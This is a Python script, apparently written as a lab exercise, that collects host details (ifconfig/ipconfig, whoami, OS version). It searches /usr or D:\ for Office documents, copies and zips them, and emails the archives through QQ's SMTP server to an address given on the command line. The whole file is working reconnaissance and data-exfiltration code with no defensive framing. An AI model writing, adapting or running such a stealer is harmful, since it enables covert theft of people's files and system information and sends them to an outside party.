# coding=utf-8
import os       #引入操作系统模块
import sys      #用于标准输入输出
from glob import *
import shutil
import zipfile
from subprocess import Popen, PIPE
from email.mime.text import MIMEText
import smtplib
from email.header import Header
from email.utils import parseaddr,formataddr#设置编码格式
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders
import getopt

def getIfconfig():
    p = Popen(['ifconfig'], stdout=PIPE)
    data = p.stdout.read()
    return data

def getipconfig():
    p = os.popen('ipconfig /all')
    context = p.read()
    return context

def getver():
    p = os.popen('ver')
    data = p.read()
    return data

def getos():
    p = Popen(['uname'], stdout=PIPE)
    data = p.stdout.read()
    return data

def gethostname():
    p = Popen(['whoami'], stdout=PIPE)
    data = p.stdout.read()
    return data

def getosname():
    p = os.popen('whoami')
    data = p.read()
    return data

def matchWildcard(rootPath = "", pattern = ""):
    rootPath = os.path.abspath(rootPath)
    results = []
    for root,dirs,files in os.walk(rootPath):
        for match in glob(os.path.join(root, pattern)):
            results.append(match)
    print(results)
    return results

def find_last(string,str):
    last_position=-1
    while True:
        position=string.find(str,last_position+1)
        if position==-1:
            return last_position
        last_position=position

def zipDir(dirpath,outFullName):
    zip = zipfile.ZipFile(outFullName,"w",zipfile.ZIP_DEFLATED)
    for path,dirnames,filenames in os.walk(dirpath):
        fpath = path.replace(dirpath,'')

        for filename in filenames:
            zip.write(os.path.join(path,filename),os.path.join(fpath,filename))
    zip.close()

def coppylinux(lista,ttype):
    x = os.getcwd()
    for i in lista:
        a = find_last(i,'/')
        j = i[a + 1:(len(i) + 1)]
        shutil.copyfile(i,x + "/" + ttype + "/" + j)

def coppywindows(lista,ttype):
    x = os.getcwd()
    for i in lista:
        a = find_last(i,'\\')
        j = i[a + 1:(len(i) + 1)]
        shutil.copyfile(i,x + "\\\\" + ttype + "\\\\" + j)

def sendmail(oss,mail,flin):
    from_addr='@qq.com'
    password="" #注意此处输入的密码是自己设置的协议密码
    to_addr = mail
    smtp_server='smtp.qq.com'

    msg=MIMEMultipart()
    msg['From']="@qq.com <@qq.com>"
    msg['To']= mail + ' ' + '<' + mail + '>'
    msg['Subject']=Header('实验验证','utf-8').encode()
    msg.attach(MIMEText('实验验证','plain','utf-8'))

    if oss == "Linux":
        x = os.getcwd()
        x = x + "/" + flin
    elif oss == "Windows":
        x = os.getcwd()
        x = x + "\\" + flin

    with open(x,'rb') as f:
        mime=MIMEBase('application','zip',filename=flin)
        mime.add_header('Content-Disposition','attchment',filename=flin)
        mime.add_header('Content-ID','<0>')
        mime.add_header('X-Attachment-ID','0')
        mime.set_payload(f.read())
        encoders.encode_base64(mime)
        msg.attach(mime)

    server=smtplib.SMTP_SSL(smtp_server,465)
    server.set_debuglevel(1)
    server.login(from_addr,password)
    server.sendmail(from_addr,[to_addr],msg.as_string())
    server.quit()

def main(argv):
    try:
        opts, args = getopt.getopt(argv, "he:")
    except getopt.GetoptError:
        print("ERROR: *.py -e <your email>")
        sys.exit(2)

    for opt, arg in opts:
        if opt == "-h":
            print("*.py -e <your email>")
        elif opt == "-e":
            eemail = str(arg)
            if os.name == "posix":
                path = "/usr"

                os.mkdir(os.getcwd() + "/word/")
                os.mkdir(os.getcwd() + "/ppt/")
                os.mkdir(os.getcwd() + "/excel/")

                mes = getIfconfig()
                mes1 = gethostname()
                mes2 = getos()

                with open(os.getcwd() + "/word/message.txt", "wb+") as f:
                    f.write(mes)
                    f.write(mes1)
                    f.write(mes2)
                    f.close()
            
                lis = matchWildcard(path, "*.pptx")
                liss = matchWildcard(path, "*.ppt")
                lis1 = matchWildcard(path, "*.docx")
                lis1s = matchWildcard(path, "*.doc")
                lis2 = matchWildcard(path, "*.xlsx")
                lis2s = matchWildcard(path, "*.xls")

                coppylinux(lis,"ppt")
                coppylinux(liss,"ppt")
                coppylinux(lis1,"word")
                coppylinux(lis1s,"word")
                coppylinux(lis2,"excel")
                coppylinux(lis2s,"excel")

                e = os.getcwd()
                zipDir(e + "/word/",e + "/1.zip")
                zipDir(e + "/ppt/",e + "/2.zip")
                zipDir(e + "/excel/",e + "/3.zip")

                sendmail("Linux",eemail,"1.zip")
                sendmail("Linux",eemail,"2.zip")
                sendmail("Linux",eemail,"3.zip")
            elif os.name == "nt":
                path = "D:\\\\"

                os.mkdir(os.getcwd() + "\\\\word\\\\")
                os.mkdir(os.getcwd() + "\\\\ppt\\\\")
                os.mkdir(os.getcwd() + "\\\\excel\\\\")

                mes = getipconfig()
                mes1  = getosname()
                mes2 = getver()

                with open(os.getcwd() + "\\\\word\\\\message.txt", "w", encoding='utf-8') as f:
                    f.write(mes)
                    f.write(mes1)
                    f.write(mes2)
                    f.close()

                lis = matchWildcard(path, "*.pptx")
                liss = matchWildcard(path, "*.ppt")
                lis1 = matchWildcard(path, "*.docx")
                lis1s = matchWildcard(path, "*.doc")
                lis2 = matchWildcard(path, "*.xlsx")
                lis2s = matchWildcard(path, "*.xls")

                coppywindows(lis,"ppt")
                coppywindows(liss,"ppt")
                coppywindows(lis1,"word")
                coppywindows(lis1s,"word")
                coppywindows(lis2,"excel")
                coppywindows(lis2s,"excel")

                e = os.getcwd()
                zipDir(e + "\\\\word\\\\",e + "\\\\1.zip")
                zipDir(e + "\\\\ppt\\\\",e + "\\\\2.zip")
                zipDir(e + "\\\\excel\\\\",e + "\\\\3.zip")

                sendmail("Windows",eemail,"1.zip")
                sendmail("Windows",eemail,"2.zip")
                sendmail("Windows",eemail,"3.zip")


if __name__ == "__main__":
    main(sys.argv[1:])
